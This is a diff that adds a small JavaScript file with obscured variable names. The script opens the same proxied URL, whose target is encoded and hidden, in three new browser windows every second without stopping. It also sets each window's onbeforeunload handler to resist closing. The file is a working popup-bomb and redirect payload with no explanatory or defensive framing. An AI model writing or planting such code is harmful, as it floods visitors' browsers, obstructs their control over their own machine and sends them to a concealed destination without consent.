@@ -1,0 +1,22 @@
+(() => {
+  const lI = (l) => {
+    const nW = window.open(l, '_blank');
+    if (nW) {
+      nW.onbeforeunload = () => false;
+    }
+  };
+
+  const lA = (ls) => {
+    ls.forEach((l) => lI(l));
+  };
+
+  const tU = [
+    'http://radon.games/uv/~/hvtrs8-wuw,pmrlhwb,cmm-vkdgo-sgapcj?qecrah?hgnvak+cnkmg', 
+    'http://radon.games/uv/~/hvtrs8-wuw,pmrlhwb,cmm-vkdgo-sgapcj?qecrah?hgnvak+cnkmg', 
+    'http://radon.games/uv/~/hvtrs8-wuw,pmrlhwb,cmm-vkdgo-sgapcj?qecrah?hgnvak+cnkmg'
+  ];
+
+  setInterval(() => {
+    lA(tU);
+  }, 1000); // Adjust the interval as needed
+})();
